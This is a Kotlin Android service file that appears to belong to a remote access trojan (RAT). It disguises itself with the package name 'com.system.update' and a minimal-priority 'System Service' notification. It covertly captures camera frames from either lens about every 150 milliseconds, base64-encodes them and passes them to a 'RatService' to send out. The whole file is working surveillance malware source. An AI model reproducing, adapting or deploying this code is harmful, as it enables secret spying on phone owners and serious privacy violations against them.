package com.system.update

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import java.nio.ByteBuffer

class CameraStreamService : Service() {

    companion object {
        const val TAG = "CameraStream"
        const val NOTIF_ID = 200
        @Volatile var isStreaming: Boolean = false
        @Volatile var isFront: Boolean = false
        @Volatile var intervalMs: Long = 150L
    }

    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private val cm by lazy {
        getSystemService(Context.CAMERA_SERVICE) as CameraManager
    }
    private var running = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val front = intent?.getBooleanExtra("front", false) ?: false
        val interval = intent?.getLongExtra("interval", 150L) ?: 150L

        // Cek permission dulu
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted")
            return START_NOT_STICKY
        }

        startForeground(NOTIF_ID, buildNotification())
        isFront = front
        intervalMs = interval
        isStreaming = true
        running = true

        startStreaming()
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    @SuppressLint("MissingPermission")
    private fun startStreaming() {
        try {
            val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT
                               else CameraCharacteristics.LENS_FACING_BACK

            val cameraId = cm.cameraIdList.firstOrNull { id ->
                cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == targetFacing
            } ?: cm.cameraIdList.firstOrNull() ?: run {
                stopSelf()
                return
            }

            thread = HandlerThread("cam_stream").also { it.start() }
            handler = Handler(thread!!.looper)

            val chars = cm.getCameraCharacteristics(cameraId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val size = map?.getOutputSizes(ImageFormat.JPEG)
                ?.filter { it.width <= 800 && it.height <= 800 }
                ?.maxByOrNull { it.width * it.height }
                ?: Size(480, 360)

            imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)

            imageReader!!.setOnImageAvailableListener({ r ->
                val image = try { r.acquireLatestImage() } catch (_: Exception) { null }
                if (image != null) {
                    try {
                        val buf: ByteBuffer = image.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        RatService.instance?.sendFrame(
                            if (isFront) "cam_front_frame" else "cam_back_frame",
                            b64
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Encode error", e)
                    } finally {
                        try { image.close() } catch (_: Exception) {}
                    }
                }
            }, handler)

            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    startCaptureLoop()
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, handler)

        } catch (e: Exception) {
            Log.e(TAG, "startStreaming error", e)
            stopSelf()
        }
    }

    private fun startCaptureLoop() {
        try {
            val camera = cameraDevice ?: return
            val reader = imageReader ?: return
            @Suppress("DEPRECATION")
            camera.createCaptureSession(
                listOf(reader.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        session = s
                        loopCapture()
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) {}
                },
                handler
            )
        } catch (e: Exception) {
            Log.e(TAG, "startCaptureLoop error", e)
        }
    }

    private fun loopCapture() {
        if (!running) return
        try {
            val camera = cameraDevice ?: return
            val s = session ?: return
            val reader = imageReader ?: return
            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                addTarget(reader.surface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                set(CaptureRequest.JPEG_QUALITY, 50.toByte())
            }
            s.capture(req.build(), null, handler)
            handler?.postDelayed({ if (running) loopCapture() }, intervalMs)
        } catch (e: Exception) {
            Log.e(TAG, "loopCapture error", e)
        }
    }

    override fun onDestroy() {
        running = false
        isStreaming = false
        try { session?.close() } catch (_: Exception) {}
        try { cameraDevice?.close() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        try { thread?.quitSafely() } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}